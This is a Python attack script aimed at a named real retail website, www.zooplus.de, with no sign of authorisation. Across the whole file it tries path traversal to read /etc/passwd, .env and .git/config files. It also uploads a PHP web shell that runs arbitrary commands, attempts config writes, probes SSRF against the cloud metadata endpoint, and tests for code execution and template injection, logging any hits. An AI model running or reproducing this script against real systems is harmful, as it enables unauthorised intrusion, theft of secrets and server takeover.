#!/usr/bin/env python3
import requests,json,base64
from urllib.parse import urljoin
from datetime import datetime
import urllib3
urllib3.disable_warnings()

t="www.zooplus.de"
b=f"https://{t}"
r=[]
s=requests.Session()
s.headers.update({'User-Agent':'Mozilla/5.0'})

print("="*70)
print("EXPLOITING ALL VECTORS")
print("="*70)

# PATH TRAVERSAL
print("\n[1] PATH TRAVERSAL...")
files=["/etc/passwd","/.env","/config.json","/.git/config"]
for f in files:
    for p in [f"/stats/../{f.lstrip('/')}",f"/stats/../../{f.lstrip('/')}"]:
        try:
            resp=s.get(urljoin(b,p),timeout=2,verify=False)
            if resp.status_code==200 and not resp.text.strip().startswith('<!'):
                if len(resp.text)<50000:
                    r.append({"v":"path_traversal","s":"CRITICAL","f":f,"p":p,"c":resp.text[:500]})
                    print(f"  [CRITICAL] {f} accessible!")
                    break
        except:pass

# FILE UPLOAD
print("\n[2] FILE UPLOAD...")
try:
    files={'file':('shell.php','<?php system($_GET["cmd"]);?>','application/x-php')}
    resp=s.post(f"{b}/api/upload",files=files,timeout=3,verify=False)
    if resp.status_code in[200,201,302]:
        r.append({"v":"file_upload","s":"CRITICAL","st":resp.status_code,"loc":resp.headers.get('Location','')})
        print(f"  [CRITICAL] Upload success! Status: {resp.status_code}")
except:pass

# CONFIG
print("\n[3] CONFIG...")
try:
    resp=s.get(f"{b}/api/config",timeout=3,verify=False)
    if resp.status_code==200:
        r.append({"v":"config_read","s":"HIGH","c":resp.text[:500]})
        print(f"  [HIGH] Config readable!")
except:pass
try:
    resp=s.post(f"{b}/api/config",json={"debug":True},timeout=3,verify=False)
    if resp.status_code in[200,201,204]:
        r.append({"v":"config_write","s":"CRITICAL"})
        print(f"  [CRITICAL] Config writable!")
except:pass

# SSRF
print("\n[4] SSRF...")
for ep in["/api/fetch","/api/proxy"]:
    try:
        resp=s.post(urljoin(b,ep),json={"url":"http://169.254.169.254/latest/meta-data/"},timeout=2,verify=False)
        if resp.status_code in[200,400] and "metadata" in resp.text.lower():
            r.append({"v":"ssrf","s":"CRITICAL","ep":ep})
            print(f"  [CRITICAL] SSRF works: {ep}")
            break
    except:pass

# CODE EXEC
print("\n[5] CODE EXECUTION...")
for ep in["/api/execute","/api/eval"]:
    try:
        resp=s.post(urljoin(b,ep),json={"code":"print('test')"},timeout=2,verify=False)
        if resp.status_code==200 and "test" in resp.text.lower():
            r.append({"v":"code_exec","s":"CRITICAL","ep":ep})
            print(f"  [CRITICAL] Code exec: {ep}")
            break
    except:pass

# TEMPLATE
print("\n[6] TEMPLATE INJECTION...")
try:
    resp=s.post(f"{b}/api/render",json={"template":"{{7*7}}"},timeout=2,verify=False)
    if resp.status_code==200 and "49" in resp.text:
        r.append({"v":"template","s":"CRITICAL"})
        print(f"  [CRITICAL] Template injection!")
except:pass

print("\n"+"="*70)
print("SUMMARY")
print("="*70)
print(f"Total: {len(r)}")
if r:
    import os
    os.makedirs("reports",exist_ok=True)
    with open("reports/exploit_results.json","w") as f:
        json.dump({"results":r},f,indent=2)
    print(f"[+] Saved to reports/exploit_results.json")
    c=len([x for x in r if x['s']=='CRITICAL'])
    print(f"CRITICAL: {c}")
else:
    print("No exploitations")

